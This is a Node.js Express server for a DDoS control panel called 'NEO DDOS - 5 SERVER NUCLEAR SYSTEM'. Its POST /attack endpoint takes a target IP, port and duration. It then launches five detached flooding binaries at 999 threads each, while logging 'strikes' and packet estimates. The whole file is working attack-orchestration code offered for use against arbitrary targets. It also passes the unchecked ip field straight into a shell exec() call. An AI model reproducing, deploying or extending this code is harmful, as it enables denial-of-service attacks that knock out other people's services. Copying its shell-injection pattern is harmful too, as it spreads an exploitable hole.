const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());

// ========== 5 BINARY CONFIGURATION ==========
const BINARY_NAMES = ['neo1', 'neo2', 'neo3', 'neo4', 'neo5'];
const BINARY_PATHS = BINARY_NAMES.map(name => path.join(__dirname, name));

// Attack statistics
let totalAttacks = 0;
let totalPackets = 0;
const attackHistory = [];

// ========== CHECK BINARIES ON STARTUP ==========
console.log('\n' + '='.repeat(60));
console.log('🔥 NEO DDOS - 5 SERVER NUCLEAR SYSTEM 🔥');
console.log('='.repeat(60));

BINARY_PATHS.forEach((binPath, idx) => {
    if (fs.existsSync(binPath)) {
        try {
            fs.chmodSync(binPath, 0o755);
            console.log(`✅ ${BINARY_NAMES[idx]} - READY`);
        } catch (err) {
            console.log(`⚠️ ${BINARY_NAMES[idx]} - Permission error`);
        }
    } else {
        console.log(`❌ ${BINARY_NAMES[idx]} - MISSING`);
    }
});
console.log('='.repeat(60) + '\n');

// ========== ATTACK ENDPOINT ==========
// Format: {"ip": "1.2.3.4", "port": 80, "time": 60}
app.post('/attack', (req, res) => {
    const { ip, port, time } = req.body;
    
    // Validation
    if (!ip || !port || !time) {
        return res.status(400).json({ 
            error: 'Missing parameters',
            usage: '{"ip": "1.2.3.4", "port": 80, "time": 60}'
        });
    }
    
    const portNum = parseInt(port);
    const duration = parseInt(time);
    
    if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
        return res.status(400).json({ error: 'Invalid port (1-65535)' });
    }
    if (isNaN(duration) || duration < 5 || duration > 300) {
        return res.status(400).json({ error: 'Time must be 5-300 seconds' });
    }
    
    console.log(`\n💀 NUCLEAR STRIKE: ${ip}:${portNum} for ${duration}s`);
    console.log('─'.repeat(40));
    
    // Launch ALL 5 binaries SIMULTANEOUSLY
    let launched = 0;
    const startTime = Date.now();
    
    BINARY_PATHS.forEach((binPath, idx) => {
        if (fs.existsSync(binPath)) {
            // Format: ./neo1 IP PORT THREADS TIME
            const cmd = `${binPath} ${ip} ${portNum} 999 ${duration}`;
            const child = exec(cmd, { 
                detached: true, 
                stdio: 'ignore' 
            });
            child.unref();  // Detach so it runs independently
            launched++;
            console.log(`🔥 ${BINARY_NAMES[idx]} → FIRING (999 threads)`);
        } else {
            console.log(`❌ ${BINARY_NAMES[idx]} → NOT FOUND`);
        }
    });
    
    // Update statistics
    totalAttacks++;
    const totalThreads = launched * 999;
    const estimatedPackets = totalThreads * duration * 5000;
    totalPackets += estimatedPackets;
    
    attackHistory.unshift({
        target: `${ip}:${portNum}`,
        duration: duration,
        binaries_launched: launched,
        total_threads: totalThreads,
        timestamp: new Date().toISOString()
    });
    
    // Keep only last 50 attacks
    if (attackHistory.length > 50) attackHistory.pop();
    
    const launchTime = Date.now() - startTime;
    
    console.log(`\n✅ LAUNCHED: ${launched}/5 binaries in ${launchTime}ms`);
    console.log(`💪 TOTAL THREADS: ${totalThreads}`);
    console.log('─'.repeat(40) + '\n');
    
    res.json({
        success: true,
        message: `💀 ${launched}/5 NEO SERVERS ATTACKING`,
        target: `${ip}:${portNum}`,
        duration: `${duration} seconds`,
        threads_per_binary: 999,
        total_threads: totalThreads,
        binaries_launched: launched,
        launch_time_ms: launchTime,
        attack_id: Date.now()
    });
});

// ========== STATS ENDPOINT ==========
app.get('/stats', (req, res) => {
    const readyBinaries = BINARY_PATHS.filter(p => fs.existsSync(p)).length;
    
    res.json({
        system: "🔥 NEO DDOS - 5 SERVER NUCLEAR SYSTEM",
        owner: "@VISANEO | @GENZNEO",
        status: "ARMED & READY",
        binaries: {
            total: 5,
            ready: readyBinaries,
            names: BINARY_NAMES,
            online: readyBinaries
        },
        attack_stats: {
            total_attacks: totalAttacks,
            estimated_total_packets: totalPackets.toLocaleString(),
            estimated_data_gb: Math.floor(totalPackets / 125000000)
        },
        current_power: {
            threads_per_binary: 999,
            max_threads: `${readyBinaries * 999}+`,
            attack_duration_limit: "300 seconds"
        },
        recent_attacks: attackHistory.slice(0, 5)
    });
});

// ========== HEALTH CHECK ==========
app.get('/health', (req, res) => {
    const ready = BINARY_PATHS.filter(p => fs.existsSync(p)).length;
    res.json({
        status: "ONLINE",
        binaries_online: `${ready}/5`,
        total_attacks: totalAttacks,
        uptime: process.uptime()
    });
});

// ========== ROOT ENDPOINT ==========
app.get('/', (req, res) => {
    const ready = BINARY_PATHS.filter(p => fs.existsSync(p)).length;
    res.json({
        name: "🔥 NEO DDOS - NUCLEAR SYSTEM 🔥",
        version: "5.0",
        owner: "@VISANEO | @GENZNEO",
        status: ready === 5 ? "💀 FULLY ARMED" : "⚠️ PARTIALLY ARMED",
        binaries_online: `${ready}/5`,
        attack_command: {
            method: "POST",
            url: "/attack",
            headers: { "Content-Type": "application/json" },
            body: '{"ip": "1.2.3.4", "port": 80, "time": 60}'
        },
        endpoints: {
            attack: "POST /attack",
            stats: "GET /stats",
            health: "GET /health"
        }
    });
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    const ready = BINARY_PATHS.filter(p => fs.existsSync(p)).length;
    console.log('='.repeat(60));
    console.log('🔥 NEO DDOS - 5 SERVER NUCLEAR SYSTEM 🔥');
    console.log('='.repeat(60));
    console.log(`📍 PORT: ${PORT}`);
    console.log(`💀 STATUS: ${ready === 5 ? 'FULLY ARMED' : 'PARTIALLY ARMED'}`);
    console.log(`🔫 BINARIES ONLINE: ${ready}/5`);
    console.log(`💪 MAX THREADS: ${ready * 999}+`);
    console.log('='.repeat(60));
    console.log(`✅ Attack endpoint: POST /attack`);
    console.log(`📊 Stats endpoint: GET /stats`);
    console.log('='.repeat(60) + '\n');
});
